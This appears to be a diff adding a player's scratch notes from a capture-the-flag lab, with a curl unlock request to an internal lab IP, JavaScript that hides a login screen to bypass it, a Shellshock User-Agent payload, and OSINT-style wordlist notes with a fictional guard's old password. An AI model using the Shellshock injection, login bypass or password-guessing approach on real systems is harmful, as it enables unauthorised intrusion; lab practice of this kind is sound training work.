@@ -1,0 +1,30 @@
+curl -X POST http://10.82.184.163:21337/unlock \
+-H "Content-Type: application/json" \
+-d '{"k":"now_you_see_me"}'
+
+
+document.getElementById("loginWindow").style.display = "none";
+document.getElementById("mapScreen").style.display = "block";
+
+User-Agent: () { :; }; echo; /bin/ls -la
+	guard.hopkins@hopsecasylum.com
+	
+	Guard Hopkins
+	wareville
+	DoorDasher 
+	Can I just say.....I LOVE PIZZA
+	Johnnyboy 
+	King Malhare
+	EGG-cellency King Malhare
+	NEW CAPE! YES!
+Pizza1234$    (oldpasswordfor hopkines)
+ Sir Carrotbane
+WHAT THE HELL CARROTBANE!!! NOW I NEED TO CHANGE MY PASSWORD!!!!!
+WHAT THE HELL CARROTBANE!!! NOW I NEED TO CHANGE MY PASSWORD!!!!!
+HAHAHA heard they locked up my old boss Hopper. GOOD! ITS WHERE HE BELONGS , The red team battalion has been WAY better since I took control.
+
+Trying my hand at some bruteforcing challenges on thm, good to see they have /opt/hashcat-utils/src/combinator.bin on the AttackBox! Always comes in handy
+Happy 43rd anniversary to the year I was born. Yep 1982! What a year for the world.
+
+Your royal egg-cellence
+
